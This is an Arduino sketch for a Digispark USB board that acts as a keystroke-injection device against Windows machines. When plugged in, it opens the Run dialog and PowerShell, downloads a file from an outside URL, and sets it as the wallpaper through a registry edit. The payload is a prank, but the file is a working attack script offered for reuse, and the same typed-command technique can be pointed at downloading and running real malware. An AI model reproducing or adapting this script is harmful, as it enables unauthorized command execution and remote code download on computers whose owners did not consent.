/*
 * Date: 08.06.2018 
 * Author: __z01db3rg
 * Title: wallpaperChanger
 * Description: changes the wallpaper of the pc with one given by you
 * Compatibility: win10/win7
 * Variables for integration with what you want:
 * it's all commented
 * Good luck :)
 */

#include "DigiKeyboard.h"

int delayPause = 100;

void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  //change that link with the link to the wallpaper u want
  //be careful!!! if it is smth else than a *.jpg change the extension from kampf.jpg
  DigiKeyboard.print("$client.DownloadFile(\"http://i0.kym-cdn.com/photos/images/facebook/000/276/668/ad3.jpg\" , \"kampf.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\kampf.jpg\" /f");
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
